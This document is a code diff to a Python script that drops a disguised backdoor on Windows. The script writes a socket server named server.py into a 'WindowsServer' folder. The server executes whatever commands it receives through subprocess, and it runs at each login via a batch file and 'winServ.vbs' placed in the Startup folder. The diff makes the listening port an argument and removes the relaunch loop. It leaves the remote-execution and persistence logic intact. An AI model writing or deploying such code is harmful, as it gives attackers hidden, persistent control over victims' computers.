@@ -7,10 +7,11 @@ startup_path = fr"C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/P
 cwd = os.getcwd()
 server_content = r'''
 import socket
+import sys
 import subprocess
 import os
 host = "0.0.0.0"
-port = 45200
+port = int(sys.argv[1])
 
 def send_exe(command,conn):
     process = subprocess.Popen(command,
@@ -64,9 +65,7 @@ client.close()
 conn.close()
 
 '''
-batch_content = fr''':loop
-"{sys.executable}" "C:/Users/{user}/WindowsServer/server.py"
-goto loop'''
+batch_content = fr'''"{sys.executable}" "C:/Users/{user}/WindowsServer/server.py" 45200'''
 
 
 vbs_content = fr'''
@@ -87,5 +86,6 @@ with open("server.bat",'w') as f:
 os.chdir(startup_path)
 with open("winServ.vbs",'w') as f:
     f.write(vbs_content)
+
 
 
